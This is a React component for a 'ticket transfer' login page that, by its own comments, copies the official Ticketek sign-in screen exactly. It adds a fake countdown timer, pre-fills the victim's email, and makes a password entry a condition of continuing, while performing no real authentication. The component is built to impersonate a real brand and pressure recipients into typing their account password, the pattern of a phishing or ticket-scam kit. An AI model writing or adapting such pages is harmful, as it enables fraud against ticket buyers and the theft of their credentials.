import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import TicketekLogo from "@/components/TicketekLogo";

const TK_NAVY = "#081a2e";
const TK_GOLD = "#f0c83a";
const TK_GREEN = "#4e7f3a";
const TK_BLUE = "#254881";

/**
 * Recipient login page — visually matches the official Ticketek sign-in
 * reference exactly (navy header, search bar, gold countdown, email/password
 * fields, green Sign In button, Reset Password, divider, Sign up, footer).
 *
 * The email field is pre-filled with the recipient email (the address the ticket
 * was sent to) and is read-only. Clicking "Sign In" proceeds to the accept page
 * — no actual authentication is required (no forced login).
 */
export default function AcceptTransferForm({ senderName, eventName, recipientEmail, onSignIn, busy, redirectPath }) {
  const [email, setEmail] = useState(recipientEmail || "");
  const [password, setPassword] = useState("");
  const [countdown, setCountdown] = useState(513); // 8:33 matching reference

  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown(prev => Math.max(0, prev - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (secs) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  const inputStyle = {
    width: "100%", padding: "14px 16px", borderRadius: 8, border: "1px solid #d0d0d0",
    color: "#000", fontSize: 16, outline: "none", boxSizing: "border-box",
    background: "#fff",
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", color: "#000", fontFamily: "-apple-system, system-ui, sans-serif" }}>
      {/* Navy header — logo, cart, hamburger + search bar */}
      <div style={{ background: TK_NAVY, padding: "14px 18px 12px" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
          <Link to="/" style={{ textDecoration: "none", display: "flex", alignItems: "center", gap: 6 }}>
            <TicketekLogo size={22} variant="white" />
            <span style={{ color: "#fff", fontSize: 16, fontWeight: 800, letterSpacing: 1 }}>TICKETEK</span>
          </Link>
          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
              <circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
            </svg>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="1.5">
              <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
            </svg>
          </div>
        </div>
        {/* Search bar */}
        <Link to="/" style={{ textDecoration: "none", display: "flex" }}>
          <div style={{ display: "flex", alignItems: "center", background: "#fff", borderRadius: 6, overflow: "hidden", width: "100%" }}>
            <input type="text" placeholder="Search comedy shows" readOnly
              style={{ flex: 1, padding: "10px 14px", border: "none", outline: "none", fontSize: 14, color: "#999", background: "transparent", cursor: "pointer" }} />
            <div style={{ background: "#e9e9e9", padding: "10px 14px", display: "flex", alignItems: "center" }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2">
                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
              </svg>
            </div>
          </div>
        </Link>
      </div>

      {/* Gold countdown banner */}
      <div style={{ background: TK_GOLD, padding: "10px 18px", textAlign: "center" }}>
        <span style={{ fontSize: 14, fontWeight: 600, color: TK_NAVY }}>Time remaining&nbsp;&nbsp;{formatTime(countdown)}</span>
      </div>

      {/* Form area — exact replica of reference */}
      <div style={{ padding: "36px 24px 0" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", marginBottom: 28 }}>
          <h2 style={{ fontSize: 30, fontWeight: 700, color: "#000", margin: 0 }}>Sign in</h2>
          <span style={{ fontSize: 13, color: "#666" }}>*Required</span>
        </div>

        {/* Email field — pre-filled with recipient email, read-only */}
        <div style={{ marginBottom: 22 }}>
          <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Email*</label>
          <input type="email" value={email} readOnly style={{ ...inputStyle, background: "#f5f5f5", color: "#666" }} />
        </div>

        {/* Password field */}
        <div style={{ marginBottom: 32 }}>
          <label style={{ display: "block", fontSize: 14, fontWeight: 500, color: "#333", marginBottom: 8 }}>Password*</label>
          <input type="password" value={password} onChange={e => setPassword(e.target.value)} style={inputStyle} placeholder="Enter your password" />
        </div>

        {/* Sign In button — proceeds to accept page (no actual login required) */}
        <button onClick={onSignIn} disabled={busy || password.trim().length === 0}
          style={{ width: "100%", padding: "16px 0", borderRadius: 8, background: busy || password.trim().length === 0 ? "#9cb89a" : TK_GREEN, color: "#fff", fontWeight: 700, fontSize: 17, border: "none", cursor: busy || password.trim().length === 0 ? "default" : "pointer" }}>
          {busy ? "Signing in…" : "Sign In"}
        </button>

        {/* Reset Password link */}
        <div style={{ textAlign: "center", marginTop: 22 }}>
          <span style={{ color: TK_BLUE, fontSize: 15, fontWeight: 500, cursor: "pointer" }}>Reset Password</span>
        </div>

        {/* Divider */}
        <div style={{ height: 1, background: "#e1e1e1", margin: "32px 0" }} />

        {/* Sign up outline button */}
        <Link to={`/login?next=${encodeURIComponent(redirectPath || "/")}&mode=signup`}
          style={{ display: "block", width: "100%", padding: "15px 0", borderRadius: 8, border: "1px solid #d0d0d0", background: "#fff", color: "#000", fontWeight: 600, fontSize: 16, cursor: "pointer", textDecoration: "none", textAlign: "center", boxSizing: "border-box" }}>
          Sign up
        </Link>
      </div>

      {/* Footer */}
      <div style={{ padding: "48px 24px 40px", textAlign: "center" }}>
        <p style={{ fontSize: 12, color: "#888", lineHeight: 1.6, margin: 0 }}>
          We treat your personal data with care. Please find our{" "}
          <span style={{ color: TK_BLUE }}>Privacy Policy</span>
          {" "}here.
        </p>
      </div>
    </div>
  );
}